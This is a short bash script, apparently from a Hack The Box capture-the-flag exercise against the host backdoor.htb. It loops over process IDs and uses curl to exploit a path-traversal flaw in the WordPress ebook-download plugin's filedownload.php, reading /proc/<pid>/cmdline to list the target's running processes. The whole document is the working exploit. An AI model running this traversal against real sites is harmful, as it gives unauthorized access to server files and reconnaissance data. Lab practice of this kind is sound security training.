#!/bin/bash

for pid in {1..2048}; do
    curl -s -X GET "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/$pid/cmdline" | tr '\0' ' ' | grep -v "<script>window.close()</script>" | grep -a .
done

